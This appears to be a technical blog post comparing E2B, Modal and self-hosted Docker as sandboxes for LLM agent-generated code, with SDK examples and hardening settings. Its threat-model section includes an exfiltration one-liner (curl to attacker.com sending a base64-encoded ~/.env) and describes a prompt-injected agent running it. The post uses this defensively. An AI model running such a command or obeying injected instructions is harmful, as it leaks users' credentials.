Code Sandboxes: E2B, Modal, Docker

MLOps Series LLM Agents & Orchestration

LLM agents that can write and execute code are extraordinarily powerful — and extraordinarily dangerous. An agent generating Python to query a database, run data analysis, or install packages needs a place to run that code without risking the host system. Code execution sandboxes solve this problem by providing isolated, ephemeral environments where untrusted agent-generated code can run safely. This post covers the three dominant approaches: E2B's purpose-built cloud sandboxes, Modal's serverless containers, and self-managed Docker isolation.

Why Sandboxed Execution?

When an LLM agent generates code, you face a fundamental trust problem. The model might produce code that is correct and useful — or code that deletes files, exfiltrates data, or consumes unbounded resources. You cannot inspect every line before execution, especially in agentic loops where the model iterates autonomously.

The threat model for agent-generated code includes:

  • Filesystem access: Reading sensitive files (/etc/passwd, ~/.ssh/, environment variables with API keys)
  • Network exfiltration: Sending collected data to external endpoints
  • Resource exhaustion: Infinite loops, memory bombs (b"x" * 10**12), fork bombs
  • Privilege escalation: Escaping the sandbox via kernel exploits or misconfigured permissions
  • Supply chain attacks: Installing malicious packages from PyPI via pip install
Real-world incident: In early LLM agent deployments, researchers demonstrated that a model could be prompt-injected to run curl attacker.com/steal?data=$(cat ~/.env | base64) inside an unsandboxed code interpreter. The agent dutifully executed it, leaking API keys. Sandboxing is not optional — it is a hard security requirement.

E2B: Cloud Sandboxes for AI

E2B (short for "Environment to Bot") is purpose-built for LLM code execution. It provides cloud-hosted microVMs based on Firecracker — the same technology behind AWS Lambda. Each sandbox is a lightweight virtual machine with its own kernel, filesystem, and network stack, spun up in ~150ms.

The key differentiator: E2B sandboxes are designed for multi-step agent interactions. Unlike one-shot execution, the sandbox persists across multiple code execution calls within an agent session, maintaining filesystem state, installed packages, and running processes between steps.

## E2B sandbox — basic usage with the Python SDK
from e2b_code_interpreter import Sandbox

# Spin up a cloud microVM (~150ms cold start)
sandbox = Sandbox()

# Execute code — the sandbox maintains state across calls
result = sandbox.run_code("""
import pandas as pd
import numpy as np

df = pd.DataFrame({
    'model': ['GPT-4', 'Claude-3', 'Llama-3', 'Gemini'],
    'latency_ms': [420, 380, 290, 350],
    'cost_per_1k': [0.03, 0.015, 0.001, 0.007]
})
df['efficiency'] = df['cost_per_1k'] / df['latency_ms'] * 1000
print(df.to_string(index=False))
""")

print(result.text)  # stdout from the sandbox

# State persists — df is still available
result2 = sandbox.run_code("print(df['efficiency'].mean())")
print(result2.text)

# Install packages on the fly
sandbox.run_code("!pip install scikit-learn")

# Clean up — destroys the microVM entirely
sandbox.kill()
Firecracker microVMs vs containers: E2B uses Firecracker microVMs, not Docker containers. Each sandbox gets its own Linux kernel, which provides VM-level isolation (separate kernel address space) while maintaining container-like startup speed (~150ms). This is strictly stronger isolation than Docker — a kernel exploit in the sandbox cannot affect the host.

For agent frameworks, E2B integrates directly as a tool:

## E2B as a tool in a LangChain agent
from e2b_code_interpreter import Sandbox
from langchain.tools import Tool

sandbox = Sandbox()

def execute_python(code: str) -> str:
    """Execute Python code in a sandboxed environment."""
    result = sandbox.run_code(code)
    if result.error:
        return f"Error: {result.error.name}: {result.error.value}"
    output = result.text or "(no output)"
    # Truncate long outputs to save context window
    if len(output) > 3000:
        output = output[:3000] + "\n... (truncated)"
    return output

code_tool = Tool(
    name="python_executor",
    func=execute_python,
    description="Execute Python code in an isolated sandbox. "
                 "Use for data analysis, calculations, or testing."
)

# Agent uses this tool for any code execution needs
# The sandbox persists state across all tool calls in the session

E2B also supports custom sandbox templates — pre-built images with specific packages, datasets, or configurations baked in. This eliminates the cold-start penalty of installing heavy dependencies like PyTorch or TensorFlow on every session:

## Custom E2B template (defined in e2b.toml)
# e2b.toml
# [template]
# name = "data-science-sandbox"
# dockerfile = "Dockerfile"
#
# Dockerfile:
# FROM e2b/base:latest
# RUN pip install pandas numpy scikit-learn matplotlib seaborn
# COPY datasets/ /home/user/datasets/

# Build and push the template
# $ e2b template build
# $ e2b template publish

# Use the custom template — all packages pre-installed
sandbox = Sandbox(template="data-science-sandbox")
result = sandbox.run_code("import sklearn; print(sklearn.__version__)")
# Instant — no pip install needed

Modal: Serverless Code Execution

Modal takes a different approach: instead of providing pre-built sandboxes, it offers a serverless container platform where you define execution environments as code. Each function runs in its own container with a custom image, and Modal handles provisioning, scaling, and teardown. This makes it ideal for compute-heavy agent tasks that need GPUs, large memory, or parallel execution.

## Modal — define a sandboxed execution environment
import modal

app = modal.App("agent-sandbox")

# Define the container image with pre-installed packages
sandbox_image = modal.Image.debian_slim(python_version="3.11").pip_install(
    "pandas", "numpy", "scikit-learn",
    "matplotlib", "requests"
)

@app.function(
    image=sandbox_image,
    timeout=60,            # hard kill after 60s
    memory=512,            # 512 MB limit
    cpu=1.0,               # 1 vCPU
)
def execute_agent_code(code: str) -> dict:
    """Run arbitrary Python code in an isolated container."""
    import io, sys, traceback

    stdout_capture = io.StringIO()
    stderr_capture = io.StringIO()

    old_stdout, old_stderr = sys.stdout, sys.stderr
    sys.stdout = stdout_capture
    sys.stderr = stderr_capture

    try:
        exec_globals = {"__builtins__": __builtins__}
        exec(code, exec_globals)
        return {
            "status": "success",
            "stdout": stdout_capture.getvalue(),
            "stderr": stderr_capture.getvalue(),
        }
    except Exception as e:
        return {
            "status": "error",
            "error": traceback.format_exc(),
            "stdout": stdout_capture.getvalue(),
        }
    finally:
        sys.stdout = old_stdout
        sys.stderr = old_stderr

Modal's Sandbox API provides a more direct interface for agent-driven code execution with persistent filesystem state:

## Modal Sandbox API — persistent sessions for agents
import modal

app = modal.App("agent-workspace")
image = modal.Image.debian_slim().pip_install("pandas", "numpy")

with modal.Volume.ephemeral() as vol:
    sandbox = modal.Sandbox.create(
        "bash",
        image=image,
        volumes={"/workspace": vol},
        timeout=300,
        cpu=2.0,
        memory=1024,
    )

    # Run multiple commands in the same sandbox
    proc = sandbox.exec("python", "-c", "import pandas; print('ready')")
    print(proc.stdout.read())

    # Write files and execute scripts
    sandbox.exec("bash", "-c", "echo 'x,y\n1,2\n3,4' > /workspace/data.csv")
    proc2 = sandbox.exec(
        "python", "-c",
        "import pandas as pd; print(pd.read_csv('/workspace/data.csv'))"
    )
    print(proc2.stdout.read())

    sandbox.terminate()
Modal's GPU advantage: Unlike E2B, Modal natively supports GPU-attached containers. If your agent needs to run inference, fine-tune a small model, or process images with CUDA, you can add gpu="T4" or gpu="A100" to the function decorator. The GPU is provisioned on-demand and billed per second of use.

Docker-Based Sandboxes

For teams that need full control over the execution environment — or can't send code to third-party clouds — Docker provides the building blocks for self-hosted sandboxes. The trade-off: you get maximum flexibility but must handle security hardening, resource management, and lifecycle orchestration yourself.

## Self-hosted Docker sandbox — Python wrapper
import docker
import tempfile, json, time

class DockerSandbox:
    def __init__(self, image="python:3.11-slim", timeout=30):
        self.client = docker.from_env()
        self.image = image
        self.timeout = timeout

    def execute(self, code: str) -> dict:
        """Run code in an isolated Docker container."""
        container = self.client.containers.run(
            self.image,
            command=["python", "-c", code],
            detach=True,
            mem_limit="256m",           # hard memory cap
            cpu_period=100000,
            cpu_quota=50000,             # 0.5 CPU
            network_disabled=True,       # no network access
            read_only=True,              # read-only filesystem
            tmpfs={"/tmp": "size=64m"},  # writable tmpfs only
            security_opt=["no-new-privileges"],
            user="nobody",               # unprivileged user
            pids_limit=50,               # prevent fork bombs
        )

        try:
            result = container.wait(timeout=self.timeout)
            logs = container.logs(stdout=True, stderr=True)
            return {
                "exit_code": result["StatusCode"],
                "output": logs.decode("utf-8", errors="replace"),
            }
        except Exception:
            container.kill()
            return {"exit_code": -1, "output": "Execution timed out"}
        finally:
            container.remove(force=True)
Docker is not a security sandbox by default. Without explicit hardening — no-new-privileges, dropped capabilities, seccomp profiles, read-only root filesystem, disabled networking — a Docker container provides only process isolation, not security isolation. A root user inside a default container can escape to the host via multiple known techniques. Always apply defense-in-depth when using Docker for untrusted code.

For multi-step agent sessions that need persistent state (like E2B), you can keep the container running between execution calls:

## Persistent Docker sandbox — maintains state across calls
class PersistentDockerSandbox:
    def __init__(self, image="python:3.11-slim"):
        self.client = docker.from_env()
        self.container = self.client.containers.run(
            image,
            command=["sleep", "infinity"],
            detach=True,
            mem_limit="512m",
            network_disabled=True,
            security_opt=["no-new-privileges"],
            pids_limit=100,
        )

    def run(self, code: str, timeout: int = 30) -> dict:
        """Execute code inside the running container."""
        exec_result = self.container.exec_run(
            ["python", "-c", code],
            demux=True,
            user="nobody",
        )
        stdout, stderr = exec_result.output
        return {
            "exit_code": exec_result.exit_code,
            "stdout": (stdout or b"").decode(),
            "stderr": (stderr or b"").decode(),
        }

    def destroy(self):
        self.container.kill()
        self.container.remove(force=True)

# Usage — state persists across calls
sandbox = PersistentDockerSandbox()
sandbox.run("x = 42")             # define variable
result = sandbox.run("print(x)")  # x is NOT available — each exec is a new process
# For true state persistence, write to files or use a persistent Python REPL

Resource Limits & Security

Regardless of the platform, enforcing resource limits is critical. An LLM agent can easily generate code that consumes unbounded resources — either through bugs (infinite loops) or adversarial prompt injection. Every sandbox must enforce hard limits at the platform level, not in application code.

CPU & Memory

  • Memory hard limit: OOM-kill the sandbox at a fixed threshold (256MB–2GB typical)
  • CPU throttling: Limit to 0.5–2 vCPUs to prevent resource starvation of other workloads
  • PID limits: Cap at 50–100 processes to prevent fork bombs
  • Disk quota: Limit writable space to 64–512MB via tmpfs or volume quotas

Time & Network

  • Execution timeout: Hard kill after 30–120 seconds (configurable per task)
  • Network policy: Default-deny outbound; whitelist specific endpoints if needed
  • Egress logging: Log all outbound connection attempts for audit
  • Rate limiting: Cap sandbox creation to prevent DoS on the platform itself

Here is a hardened security configuration for Docker-based sandboxes, covering the critical kernel-level protections:

## Hardened Docker sandbox configuration
## Apply ALL of these for untrusted agent code

security_config = {
    # 1. Drop all Linux capabilities
    "cap_drop": ["ALL"],

    # 2. Prevent privilege escalation
    "security_opt": [
        "no-new-privileges",
        "seccomp=sandbox-seccomp.json",  # custom seccomp profile
    ],

    # 3. Read-only root filesystem
    "read_only": True,
    "tmpfs": {"/tmp": "size=64m,noexec,nosuid"},

    # 4. Run as unprivileged user
    "user": "65534:65534",  # nobody:nogroup

    # 5. Disable inter-container communication
    "network_mode": "none",

    # 6. Resource hard limits
    "mem_limit": "256m",
    "memswap_limit": "256m",  # no swap
    "cpu_period": 100000,
    "cpu_quota": 50000,       # 0.5 CPU
    "pids_limit": 50,

    # 7. Prevent mounting host paths
    "volumes": {},  # never bind-mount host directories
}

## Custom seccomp profile blocks dangerous syscalls:
##   - mount, umount     → no filesystem mounting
##   - ptrace            → no debugging other processes
##   - clone (NEWUSER)   → no user namespace creation
##   - keyctl            → no kernel keyring access
##   - bpf               → no eBPF program loading
Defense in depth: No single security control is sufficient. Combine container isolation (namespaces, cgroups) + seccomp profiles (syscall filtering) + capability dropping (no root powers) + network policy (default deny) + execution timeouts (hard kill). For maximum security, run containers inside lightweight VMs (like Firecracker or gVisor) to add a kernel-level isolation boundary.

Platform Comparison

Each platform makes different trade-offs between security, flexibility, cost, and operational complexity. Here is a structured comparison across the dimensions that matter most for LLM agent workloads:

E2B

  • Isolation level: Firecracker microVM (VM-level)
  • Cold start: ~150ms
  • Session persistence: ✅ Native multi-step
  • GPU support: ❌ CPU only
  • Custom environments: Dockerfile templates
  • Pricing: Per-second sandbox billing
  • Best for: AI-native code interpreters, data analysis agents

Modal

  • Isolation level: gVisor container (kernel-level)
  • Cold start: ~300ms (cached image), ~5s (new image)
  • Session persistence: ✅ Via Sandbox API
  • GPU support: ✅ T4, A10G, A100, H100
  • Custom environments: Python-defined images
  • Pricing: Per-second compute billing
  • Best for: GPU-heavy workloads, ML inference in agents

Self-Hosted Docker

  • Isolation level: Linux namespaces + cgroups (process-level)
  • Cold start: ~500ms (cached), ~10s (pull image)
  • Session persistence: 🔧 Manual (keep container alive)
  • GPU support: ✅ Via nvidia-docker runtime
  • Custom environments: Full Dockerfile control
  • Pricing: Infrastructure cost only
  • Best for: Air-gapped environments, full control, cost optimization at scale

Decision Matrix

  • Need fastest setup? → E2B (SDK install + API key)
  • Need GPUs? → Modal or self-hosted Docker
  • Air-gapped / on-prem? → Self-hosted Docker
  • Strongest isolation? → E2B (Firecracker VM)
  • Lowest cost at scale? → Self-hosted Docker
  • Agent framework integration? → E2B (first-class support)

Here is a unified wrapper that abstracts over all three platforms, letting your agent framework switch backends without code changes:

## Unified sandbox interface — swap backends freely
from abc import ABC, abstractmethod
from dataclasses import dataclass

@dataclass
class ExecutionResult:
    stdout: str
    stderr: str
    exit_code: int
    timed_out: bool = False

class SandboxBackend(ABC):
    @abstractmethod
    def execute(self, code: str) -> ExecutionResult: ...
    @abstractmethod
    def destroy(self): ...

class E2BSandbox(SandboxBackend):
    def __init__(self, template=None):
        from e2b_code_interpreter import Sandbox
        self.sb = Sandbox(template=template) if template else Sandbox()

    def execute(self, code):
        r = self.sb.run_code(code)
        return ExecutionResult(
            stdout=r.text or "",
            stderr=str(r.error) if r.error else "",
            exit_code=0 if not r.error else 1,
        )

    def destroy(self):
        self.sb.kill()

class DockerSandboxBackend(SandboxBackend):
    def __init__(self, image="python:3.11-slim"):
        import docker
        self.client = docker.from_env()
        self.container = self.client.containers.run(
            image, ["sleep", "infinity"],
            detach=True, mem_limit="256m",
            network_disabled=True,
            security_opt=["no-new-privileges"],
        )

    def execute(self, code):
        r = self.container.exec_run(["python", "-c", code], demux=True)
        out, err = r.output
        return ExecutionResult(
            stdout=(out or b"").decode(),
            stderr=(err or b"").decode(),
            exit_code=r.exit_code,
        )

    def destroy(self):
        self.container.kill()
        self.container.remove(force=True)

# Factory — choose backend via config
def create_sandbox(backend: str = "e2b") -> SandboxBackend:
    if backend == "e2b":
        return E2BSandbox()
    elif backend == "docker":
        return DockerSandboxBackend()
    else:
        raise ValueError(f"Unknown backend: {backend}")
Production recommendation: Start with E2B for prototyping — the SDK is minimal and sandboxes are secure by default. Migrate to self-hosted Docker when you need cost control at scale (>1000 sandbox-hours/month) or must keep code execution on-premise. Use Modal when your agents need GPU compute or you want to avoid managing infrastructure entirely.

Key takeaway: Code execution sandboxes are the security foundation for any LLM agent that generates and runs code. The choice between E2B, Modal, and Docker comes down to your security requirements, infrastructure constraints, and operational budget. Regardless of platform, enforce hard resource limits, default-deny networking, and ephemeral environments. Treat every line of agent-generated code as untrusted — because it is.
